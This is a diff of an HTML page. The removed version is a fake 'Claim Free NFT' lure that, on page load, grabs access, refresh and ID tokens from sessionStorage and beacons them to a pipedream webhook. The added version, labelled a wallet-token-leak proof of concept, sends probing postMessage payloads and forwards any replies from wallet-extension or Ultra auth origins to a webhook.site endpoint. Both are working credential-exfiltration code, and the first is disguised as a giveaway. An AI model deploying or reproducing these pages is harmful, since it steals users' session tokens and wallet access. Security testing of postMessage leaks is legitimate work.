@@ -1,28 +1,49 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Free NFT Mint</title>
+  <title>Ultra Wallet Test PoC</title>
   <script>
-    window.onload = function () {
-      setTimeout(() => {
-        const url = 'https://eoeofsj8fajkjtm.m.pipedream.net';
-        const data = {
-          access_token: sessionStorage.getItem("access_token"),
-          refresh_token: sessionStorage.getItem("refresh_token"),
-          id_token: sessionStorage.getItem("id_token"),
-          location: window.location.href,
-          userAgent: navigator.userAgent
-        };
+    // Listen for responses from the Ultra Wallet
+    window.addEventListener("message", function (event) {
+      // Only act on responses from the wallet extension or Ultra auth origin
+      if (
+        event.origin.startsWith("chrome-extension://") ||
+        event.origin.includes("auth.ultra.io")
+      ) {
+        fetch("https://webhook.site/b8db8262-3b89-4f75-9056-9438c014bed1", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            origin: event.origin,
+            data: event.data,
+            location: window.location.href,
+            userAgent: navigator.userAgent
+          })
+        });
+      }
+    });
 
-        const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
-        navigator.sendBeacon(url, blob);
-        console.log("🚀 Attempted send to webhook");
-      }, 1000);
+    // Try various postMessage payloads
+    window.onload = function () {
+      const payloads = [
+        { type: "ultra:getTokens" },
+        { type: "oauth2:getTokens" },
+        { type: "ultra:getIdentity" },
+        { type: "ultra:getAuthState" },
+        { type: "get_auth_tokens" },
+        { type: "ultra:getAccessToken" }
+      ];
+
+      payloads.forEach((msg, i) => {
+        setTimeout(() => {
+          window.postMessage(msg, "*");
+        }, i * 500); // staggered to avoid noise
+      });
     };
   </script>
 </head>
 <body>
-  <h1>🎉 Claim Free NFT</h1>
-  <button onclick="alert('Wallet connected!')">Connect Wallet</button>
+  <h1>Ultra Wallet Test Page</h1>
+  <p>If this page is loaded inside the Ultra Wallet or dApp frame, it will test for token leaks via postMessage.</p>
 </body>
 </html>
